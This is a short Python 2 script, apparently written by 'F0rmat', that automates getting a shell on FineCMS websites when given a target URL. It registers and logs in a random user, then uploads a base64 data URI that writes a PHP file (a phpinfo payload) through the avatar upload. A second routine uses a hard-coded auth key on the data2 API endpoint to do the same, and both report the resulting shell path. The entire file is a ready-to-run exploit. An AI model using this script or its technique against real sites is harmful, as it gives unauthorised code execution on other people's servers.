#coding:utf-8
#author：F0rmat
'''
finecms.py是全部finecms Getshell的代码文件，只要输入python finecms URL就可以全自动Getshell。
exp_upload函数是用了前辈的代码，感觉写得不错，我就不再造轮子了，修改了一些获取ID，然后得到shell的地址。
'''
import random
import sys
import requests
import time

url = sys.argv[1]

def exp_upload(url):
    username = random.randint(0, 999999)
    seed = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    email = []
    for i in range(8):
        email.append(random.choice(seed))
    email = ''.join(email)

    # step 1 register
    # print "[+] register user"
    register_url = url + "/index.php?s=member&c=register&m=index"
    register_payload = {"back": "", "data[username]": username, "data[password]": "123456", "data[password2]": "123456",
                        "data[email]": email + "@" + email + ".com"}
    # step 2 login
    # print "[+] user login"
    login_url = url + "/index.php?s=member&c=login&m=index"
    login_payload = {"back": "", "data[username]": username, "data[password]": "123456", "data[auto]": "1"}
    # step 3 attack
    # print "[+] loading payload"
    vul_url = url + "/index.php?s=member&c=account&m=upload"
    vul_payload = {"tx": "data:image/php;base64,RjBybWF0PD9waHAgcGhwaW5mbygpOz8+"}
    try:
        s = requests.session()
        s.post(register_url, data=register_payload)
        result2 =s.post(login_url, data=login_payload).cookies
        result3 = s.post(vul_url, data=vul_payload).content
        expid=result2.get("member_uid")
        if "status" in result3:
            print "shell:"+url+"/uploadfile/member/"+expid+"/0x0.php"
        else:
            return False
    except Exception, e:
        pass
def exp_data2(target):
    payload = "/index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,RjBybWF0PD9waHAgcGhwaW5mbygpOz8+"
    url = target+payload
    shell = target+'/uploadfile/member/0/0x0.php'
    try:
        requests.get(url, timeout=3)
        verify = requests.get(shell, timeout=3)
        if verify.status_code == 200:
            print 'Write success,shell:',shell
        else:
            print 'Oh!Sorry,Getshell failure!'
    except Exception, e:
        print e

print 'using exp_upload...'
exp_upload(url)
time.sleep(1)
print 'using exp_data2...'
exp_data2(url)
print 'Complete！'

